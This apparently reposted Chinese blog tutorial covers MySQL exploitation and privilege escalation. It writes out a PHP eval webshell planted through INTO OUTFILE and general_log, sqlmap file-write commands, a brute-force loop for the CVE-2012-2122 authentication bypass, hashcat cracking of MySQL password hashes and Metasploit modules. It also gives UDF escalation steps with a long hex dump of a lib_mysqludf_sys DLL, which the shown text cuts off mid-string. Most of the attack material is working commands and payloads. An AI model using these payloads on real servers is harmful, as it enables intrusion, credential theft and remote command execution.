        <content type="html"><![CDATA[<p>以下大部分内容转载自<a href="https://www.sqlsec.com/2020/11/mysql.html">MySQL 漏洞利用与提权</a></p><h1 id="权限获取"><a href="#权限获取" class="headerlink" title="权限获取"></a>权限获取</h1><h2 id="数据库操作权限"><a href="#数据库操作权限" class="headerlink" title="数据库操作权限"></a>数据库操作权限</h2><p>提权之前得先拿到高权限的 MySQL 用户才可以，拿到 MySQL 的用户名和密码的方式多种多样，但是不外乎就下面几种方法：</p><ol><li>MySQL 3306 端口弱口令爆破</li><li>sqlmap 注入的 <code>--sql-shell</code> 模式</li><li>网站的数据库配置文件中拿到明文密码信息</li><li>CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限</li></ol><h2 id="WebShell权限"><a href="#WebShell权限" class="headerlink" title="WebShell权限"></a>WebShell权限</h2><h3 id="into-oufile写shell"><a href="#into-oufile写shell" class="headerlink" title="into oufile写shell"></a><code>into oufile</code>写shell</h3><p>写入条件：</p><ul><li>知道网站物理路径</li><li>高权限数据库用户</li><li><code>load_file()</code> 开启 即 <code>secure_file_priv</code> 无限制</li><li>网站路径有写入权限</li></ul><p>首先基础语法查询是否 <code>secure_file_priv</code> 没有限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure_file_priv%&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [mysql]&gt; show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><table><thead><tr><th>Value</th><th>说明</th></tr></thead><tbody><tr><td>NULL</td><td>不允许导入或导出</td></tr><tr><td>/tmp</td><td>只允许在 /tmp 目录导入导出</td></tr><tr><td>空</td><td>不限制目录</td></tr></tbody></table><blockquote><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p><p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p></blockquote><h4 id="查看MySQL版本"><a href="#查看MySQL版本" class="headerlink" title="查看MySQL版本"></a>查看MySQL版本</h4><p>方法一：登录时回显信息</p><p>方法二：<code>select version();</code></p><p>方法三：<code>select @@version;</code></p><p>方法四：<code>mysql -V</code></p><h3 id="sqlmap写shell"><a href="#sqlmap写shell" class="headerlink" title="sqlmap写shell"></a>sqlmap写shell</h3><p>sqlmap更多写shell方法参考</p><p>windows下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span> -<span class="operator">-file</span><span class="literal">-write</span>=<span class="string">&#x27;shellpass.php&#x27;</span> -<span class="operator">-file</span><span class="literal">-dest</span>=<span class="string">&quot;D:\\phpstudy_pro\\WWW\\testshell\\shellpass.php&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010220451833.png" alt="image-20211010220451833"></p><p>linux下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span> -<span class="operator">-file</span><span class="literal">-write</span>=<span class="string">&#x27;shellpass.php&#x27;</span> -<span class="operator">-file</span><span class="literal">-dest</span>=<span class="string">&quot;/var/www/html/test/shell.php&quot;</span></span><br></pre></td></tr></table></figure><h3 id="原生的-SQL-语句来直接写-shell："><a href="#原生的-SQL-语句来直接写-shell：" class="headerlink" title="原生的 SQL 语句来直接写 shell："></a>原生的 SQL 语句来直接写 shell：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[pass]); ?&gt;&#x27; into outfile &#x27;D:\\phpstudy_pro\\WWW\\testshell\\shellpass.php&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010201758722.png" alt="image-20211010201758722"></p><blockquote><p>一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[pass]); ?&gt;&#x27; into outfile &#x27;/var/www/html/shellpass.php&#x27;;</span><br></pre></td></tr></table></figure><h3 id="日志文件写shell"><a href="#日志文件写shell" class="headerlink" title="日志文件写shell"></a>日志文件写shell</h3><ul><li>Web 文件夹宽松权限可以写入</li><li>Windows 系统下</li><li>高权限运行 MySQL 或者 Apache</li></ul><p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">+------------------+-----------------------------------------------------------------+</span><br><span class="line">| Variable_name    | Value                                                           |</span><br><span class="line">+------------------+-----------------------------------------------------------------+</span><br><span class="line">| general_log      | OFF                                                             |</span><br><span class="line">| general_log_file | D:\phpstudy_pro\Extensions\MySQL5.5.29\data\xxxx.log |</span><br><span class="line">+------------------+-----------------------------------------------------------------+</span><br><span class="line">MariaDB [(none)]&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">+------------------+---------------+</span><br><span class="line">| Variable_name    | Value         |</span><br><span class="line">+------------------+---------------+</span><br><span class="line">| general_log      | OFF           |</span><br><span class="line">| general_log_file | localhost.log |</span><br><span class="line">+------------------+---------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p><p>可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell：</p><p>更改日志文件位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;;</span><br><span class="line">set global general_log_file=&#x27;D:\\phpstudy_pro\\WWW\\testshell\\shellpass.php&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010224712241.png" alt="image-20211010224712241"></p><p>往日志里面写入 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[pass])?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010225346136.png" alt="image-20211010225346136"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010225332031.png" alt="image-20211010225332031"></p><h2 id="Hash-获取与解密"><a href="#Hash-获取与解密" class="headerlink" title="Hash 获取与解密"></a>Hash 获取与解密</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># MySQL &lt;= 5.6 版本</span><br><span class="line">mysql&gt; select host, user, password from mysql.user;</span><br><span class="line">+-----------+------+-------------------------------------------+</span><br><span class="line">| host      | user | password                                  |</span><br><span class="line">+-----------+------+-------------------------------------------+</span><br><span class="line">| localhost | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| 127.0.0.1 | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| ::1       | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| localhost |      |                                           |</span><br><span class="line">+-----------+------+-------------------------------------------+</span><br><span class="line"># MySQL &gt;= 5.7 版本</span><br><span class="line">mysql &gt; select host,user,authentication_string from mysql.user;</span><br><span class="line">+-----------+---------------+-------------------------------------------+</span><br><span class="line">| host      | user          | authentication_string                     |</span><br><span class="line">+-----------+---------------+-------------------------------------------+</span><br><span class="line">| localhost | root          | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">+-----------+---------------+-------------------------------------------+</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010225704301.png" alt="image-20211010225704301"></p><h3 id="使用hashcat"><a href="#使用hashcat" class="headerlink" title="使用hashcat"></a>使用hashcat</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat.exe <span class="literal">-a</span> <span class="number">0</span> <span class="literal">-m</span> <span class="number">300</span> -<span class="literal">-force</span> <span class="string">&#x27;81F5E21E35407D884A6CD4A731AEBFB6AF209E1B&#x27;</span> <span class="string">&#x27;E:\fuzz\test_bp\test_password.txt&#x27;</span> -<span class="literal">-show</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211011095647446.png" alt="image-20211011095647446"></p><h2 id="MySQL漏洞"><a href="#MySQL漏洞" class="headerlink" title="MySQL漏洞"></a>MySQL漏洞</h2><h3 id="yaSSL-缓冲区溢出"><a href="#yaSSL-缓冲区溢出" class="headerlink" title="yaSSL 缓冲区溢出"></a>yaSSL 缓冲区溢出</h3><p>MySQL yaSSL SSL Hello Message Buffer Overflow 缓冲区溢出漏洞  MSF 对应的模块：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_yassl_hello</span><br><span class="line">msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello</span><br></pre></td></tr></table></figure><blockquote><p><strong>Linux</strong> : MySQL 5.0.45-Debian_1ubuntu3.1-log</p><p><strong>Windows</strong> : MySQL 5.0.45-community-nt</p></blockquote><h3 id="CVE-2012-2122"><a href="#CVE-2012-2122" class="headerlink" title="CVE-2012-2122"></a>CVE-2012-2122</h3><p>只要知道用户名，不断尝试就能够直接登入SQL数据库。</p><p>当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。按照公告说法大约256次就能够蒙对一次。</p><h4 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h4><p>All MariaDB and MySQL versions up to <strong>5.1.61, 5.2.11, 5.3.5, 5.5.22</strong> are vulnerable.<br>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.<br>MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.</p><p><strong>msf_payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211011111218374.png" alt="image-20211011111218374"></p><p><strong>linux_shell</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `seq 1 1000`; do mysql -uroot -pwrong -h 192.168.201.1 -P3306 ; done</span><br></pre></td></tr></table></figure><h1 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h1><p>自定义函数，是数据库功能的一种扩展。用户通􏰁自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像调用本机函数 version() 等方便。</p><h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><p>如果是 MySQL &gt;= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p><p>那么动态链接库文件去哪里找呢？实际上我们常用的工具 sqlmap 和 Metasploit 里面都自带了对应系统的动态链接库文件。</p><h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p><strong>sqlmap 的 UDF 动态链接库文件位置</strong>：sqlmap根目录<code>/data/udf/mysql</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS E:\web\sqlmap\data\udf\mysql&gt; tree</span><br><span class="line">E:.</span><br><span class="line">├─linux</span><br><span class="line">│  ├─32</span><br><span class="line">│  └─64</span><br><span class="line">└─windows</span><br><span class="line">    ├─32</span><br><span class="line">    └─64</span><br></pre></td></tr></table></figure><blockquote><p>不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具<strong>cloak.py</strong> 来解码使用，cloak.py 的位置为：<code>/extra/cloak/cloak.py</code> ，解码方法如下：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看当前目录情况</span></span><br><span class="line">➜ pwd</span><br><span class="line">E:\web\sqlmap\extra\cloak</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解码 64 位的 Windows 动态链接库</span></span><br><span class="line">➜ python .\cloak.py -d -i &#x27;E:\web\sqlmap\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_&#x27; -o lib_mysqludf_sys_64.dll</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解码 32 位的 Linux 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解码 64 位的 Linux 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解码 32 位的 Windows 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看当前目录下的情况</span></span><br><span class="line">➜ ls</span><br><span class="line">README.txt              cloak.py                lib_mysqludf_sys_32.so  lib_mysqludf_sys_64.so</span><br><span class="line">__init__.py             lib_mysqludf_sys_32.dll lib_mysqludf_sys_64.dll</span><br></pre></td></tr></table></figure><p><strong>Metasploit 的 UDF 动态链接库文件位置</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/data/exploits/mysql</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020100147961.png" alt="image-20211020100147961"></p><p><a href="http://test-pic-test.oss-cn-guangzhou.aliyuncs.com/document/sqlmap%20udf.zip">sqlmap 解码后的动态链接库</a></p><h3 id="寻找目录插件"><a href="#寻找目录插件" class="headerlink" title="寻找目录插件"></a>寻找目录插件</h3><p>把 UDF 的动态链接库文件放到 MySQL 的插件目录下，使用SQL语句查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020100622882.png" alt="image-20211020100622882"></p><p>如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 <code>\lib\plugin</code> 文件夹：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select 233 into dumpfile &#x27;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p>通过 NTFS ADS流创建文件夹成功率不高，目前 MySQL 官方貌似已经阉割了这个功能。那么如果找到 MySQL 的安装目录呢？通用也有对应的 SQL 语句可以查询出来：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@basedir;</span><br><span class="line">+------------------+</span><br><span class="line">| @@basedir        |</span><br><span class="line">+------------------+</span><br><span class="line">| /usr/local/mysql |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><h3 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h3><p>写入动态链接库可以分为下面几种情形：</p><ul><li>SQL 注入且是高权限</li><li>plugin 目录可写且需要 <strong>secure_file_priv 无限制</strong></li><li>MySQL 插件目录可以被 MySQL 用户写入</li></ul><p>这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有字节长度限制，所以往往 POST 注入才可以执行这种攻击</p><h4 id="存在sql注入使用sqlmap"><a href="#存在sql注入使用sqlmap" class="headerlink" title="存在sql注入使用sqlmap"></a>存在sql注入使用sqlmap</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost:30008/&quot; --data=&quot;id=1&quot; --file-write=&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot; --file-dest=&quot;/usr/lib/mysql/plugin/udf.so&quot;</span><br></pre></td></tr></table></figure><p><a href="http://test-pic-test.oss-cn-guangzhou.aliyuncs.com/document/sqlmap_udf_mysql.zip">sqlmap_udf_mysql.zip</a></p><h4 id="没有注入点"><a href="#没有注入点" class="headerlink" title="没有注入点"></a>没有注入点</h4><p>操作原生 SQL 语句，这种情况下当 <strong>secure_file_priv 无限制</strong>的时候，我们也是可以手工写文件到 plugin 目录下的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 直接 SELECT 查询十六进制写入</span><br><span class="line">SELECT 0x7f454c4602... INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;</span><br><span class="line"></span><br><span class="line"># 解码十六进制再写入多此一举</span><br><span class="line">SELECT unhex(&#x27;7f454c4602...&#x27;) INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;</span><br></pre></td></tr></table></figure><p>获取十六进制的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 直接传入路径编码</span><br><span class="line">SELECT hex(load_file(&#x27;/lib_mysqludf_sys_64.so&#x27;));</span><br><span class="line"></span><br><span class="line"># 也可以将路径 hex 编码</span><br><span class="line">SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f));</span><br></pre></td></tr></table></figure><p>一般为了更方便观察，可以将编码后的结果导入到新的文件中方便观察：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT hex(load_file(&#x27;/lib_mysqludf_sys_64.so&#x27;)) into dumpfile &#x27;/tmp/udf.txt&#x27;; </span><br><span class="line"></span><br><span class="line">SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f)) into dumpfile &#x27;/tmp/udf.txt&#x27;;</span><br></pre></td></tr></table></figure><h4 id="lib-mysqludf-sys-32-dll"><a href="#lib-mysqludf-sys-32-dll" class="headerlink" title="lib_mysqludf_sys_32.dll"></a>lib_mysqludf_sys_32.dll</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a24000000000000004d477bd0092615830926158309261583005e86830b261583005e808308261583005e968307261583005e91830b2615832ee06e830a2615830926148325261583005e9c8308261583005e878308261583005e8483082615835269636809261583000000000000000000000000000000000000000000000000504500004c0103004afe9f5a0000000000000000e00002210b010900001000000010000000600000607c0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007c83000008020000b4820000c800000000800000b402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002c7e00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000e0555058310000000000100000007000000010000000040000000000000000000000000000400000e02e7273726300000000100000008000000006000000140000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d090208b92bcf11b11ceea24f550000560c000000220000260000a8ffffffff8b4c240833c03901741656578b7c24146a0c59be000010dcf3a566a55fb0015e5dfb77fbc38b44240c1a6a071611108bf8183218ff63db6f1ca45fc7011e1200210883380175128b40040df6776f0700750a1004c6000132c0c3530abf1df68d3c3053a454082d08ff30ff15fff6ee776c885985c075085614c601011bc8568d71018a11fd6fdffe4184d275f98b54142bce890a32558bec8b4d0c833902b7d860bf5374148b7d10915c5453eb4cbf9dbddf8b417d740f1b707c1bebe5836004dbb1ffb7001a0c8b48048b008d4401025072a0594c08dfc8d7b5891678113006a44ceb6c57beb7b2b85f5e5da30421740833dbb63ff6a8591353568b742410d878534602db85db5bb6460851c78d5c4257e8240b75eeeebfe01400c604070008ff70041e0553b1db1b921a22c418535720030054090f09b7086a995b0f98599954cf2d343713b8f4540b1edeb60d818403552251519d35dffed6fedf576800f762d66a018945fc068bf08b4560dd7ff70cc606004533ff595939387471683cc071c6fedfda9c12260c3bc7745b506a04ff75fc149073e1edd7a9fd48533afc8d48911040b963dbff2bc18bd88d043b505630f8268c5330d8ad8dbd5f03fe570e940de57df8463fe6364c2066ba5b1810a4803e0059169eb0ff741a8bc6c64437ff00594d1489c906987bebd86f183e5f205ec9c3eed7b235dcbaf37d574708c45030087bdbdacdc9c26a4078c710548d4601b9e07e614251724f0856ff31cf6bafdd9db694c66aff8dc32082f63a58b0b6030d092c23005f7cc36e57036c6a081d1290ac0aa88365fc2f6c2f2c2d4592d0eb071b408f65e8c70bbfd66e42feff000d1fedc25e3bffdb17b60d08209a02f3c3e90806f58bff56688000002d8c6d675880985608845aa3bde0febb062358045485f675054daa83260076fbb7db4508c36f08ed09acc704240607ff0b4c113637598d71ffcf9c0bbf77dfc9750e39056b107e3cff7310830b01fbeec6bb8b0910548b098f57890a23480f85d47d618cbbad641718068b79040838071b76edeebb1e50eb184aa705b8e61768b0b030d8e803a83c0957c1d6bbaeb5d6a1e7e9e2573ca12f4c6a6ff777c3025efd096a1fee76eb3caa10c80475ed7befc0c7051f281a70e027071bdff79d5cb520bc04b81b6a5635b952eb782b7339b2e3696ff7defd7340393d155c741c68062809ac43db6b85850d9e1034252316ffe666f862f154b201dc0801592cc2b1a1db78049ddfdbf62413d90fd4fc83f80266b16f6cb0d2595bffa0584b77783bb5783106350f8487c71996ee4cd3543bf81810897d82efc796be35fac87251833f8af36a7c398587b4f10774e9ffc8d60f7c89c5db9bb5d955f85615441b474ded5be38ef88a394d1003d00874b48909437aa36d020c1ad3f8eba71c3162cc5a64442e386161fb0a58064c32fc19503f1bdf720443375bc9c20cc710fb02231fb2288b2ef28b5d081cae0fdb9b54e433c95cfc7d2008016c2dc6c23bf15a393a4417e4d61bfe7fafae3bf0740583fe02752e1910d03bc1e7166eb8ed57565fd03b5ee40003937b703b67115a039614168012376c7d270a8227fea0246420575062b30d661327002f527f8df61ad2061153f76a037543b067bb614f34032168742e2c0d2c3cec257feb1b71ec5a09706a7c6faae05051597c64825d900eadf62ffa8a19066b8f91b6c72ae490c396ec1640e134a9ff3b246abb41c1f17926547dbc550c0d381e33bc05bc595d382281ec2832f7869f365f212043211c895e2118891d05f78ec243143c21a2aa210c668c186c5ffbda3806252c0620080605dd2dcdd20425002d7ffc9c8f7ab6b1f6143095562407042831d6fedb7f0807348b85e0fca0aa701ddbb5b395011c1920241318092b18476a565f201cb360c32c9f7b8985d8320a04dc03b557e01b243468dedfd1f7d8d360ce2879d40a2c833d208dbdc3da00f923685b1b300bdfaf67f534c97f23401ec25f6a4849918f144a50152e9df458aaf8a29c10f3eb67611c7e052c37d4598feded8321b9273551e0f5ee3bdc0abf03e4507f4b8417185bdb7e600bce1cdc142cd6e288b154b609e01b14f413160a4bdb313ddcdbffdc84676cc859d94e1e07f7d81bf076bbb7c00359485d1656b8bc18be04a3638b6f2af83bc673080753025073d85f60835a3bfe72f15f5e25206c6053c820cc006f35b4dd452bb84d5a346627040b85bf2b5e6e413c03c1813850e45fefa5ecfffb33d2b90b011c48180f94c28bc25dc33fb702bf35e34831c80fb74114ae057106c1a55b6c33578c081817761bffff2ff1d7487bf972098b580803d93bfb720a4283c0283bd67270ca36b5e86ae55dc38f6afef0cd71f7a970040b056418005083ec080db7c670082f316c33c576f0852f06df64a31a89b90968555db7f081f0b2091c6b04f555972dd12c937d1350195c083b04e1c26f2724c1e81ff715e0018fefb6532b034f230059948be55dc3621ddb49a301ca3dafc0fae99525242631ccff29343232b61058054c50ac2cb41e97af12b60d56096b27d7616b20cfb0fbef2ae4e03160031f73d9665b9a6c038d2be0fafc046ba039f13cb4fc8a0d6c120c7d0dc395c3c1619c965154147fe41f3e783124f020140bdac40e5643b25d53ec1068f885626df4f888c9bf4ee640bb25eea0398466820d85c33149db9f0a359a04eb605675f869639fc1f6448b7598751f1033f0071476e6ca20189d271cb4f6ee6fedf4330c113bf77507be4f59eb0b85f30a7b047ea10ac1e0100bf0ce00f7d6076c840d1e045e5f01c33f5c05646464646064686c1405766474b000003ff4c20e034b0f20185f4e6f20ffffb7ff617267756d656e7473096c6c6f77656420287564663a206c69625f6dccfd6df77973716c0d5f73085f696e666f293918dfb6ff8f2076657273696f6e20302e01341f45787065f6dbdbdd637447657861076c79201a65207374723f5bdb5afb672074791b75726171217258c00e602b7477911fd86f030b3f8672206e616d48dbb1b71f436f756c246e6f74c4636113203058b76d186d2779af72f1483fda4d943f2003121071051bf29d5860214707d0604d0d0b0f81cb074ed961dd9703ab17cc2708a77527ecc00fd81f0a3b034fc0a07b851f03240328c1556583a200c5889251ca22d877bdb119bf44ff000f5565a3aa00a8aa9251645455c95532aaaafff61d455c0410020157616974466f00fc06c07253886c654f626a07c07f6b99145669727475616c417603e0f6370d536574456e76126f6ec000bc6dbf5661726961622b4118437265f76deb6e94546806640d47264375727222cd12f65b502a636573734914266e03e083135469636bde6e6bb1f6b6fd5175657279500366846d616e371667ef1b00fd0144697367374cfdb7eded6962727879